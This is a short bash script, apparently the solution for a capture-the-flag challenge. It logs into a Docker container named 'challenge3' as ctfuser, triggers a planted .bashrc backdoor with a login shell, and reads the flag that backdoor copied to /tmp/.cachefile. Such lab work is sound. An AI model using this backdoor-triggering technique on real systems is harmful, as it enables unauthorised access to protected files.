#!/bin/bash
set -e

CONTAINER="challenge3"

echo "[*] Triggering login shell to execute .bashrc backdoor..."
docker exec -u ctfuser $CONTAINER bash -lc 'true'

echo "[*] Reading copied flag..."
docker exec -u ctfuser $CONTAINER cat /tmp/.cachefile
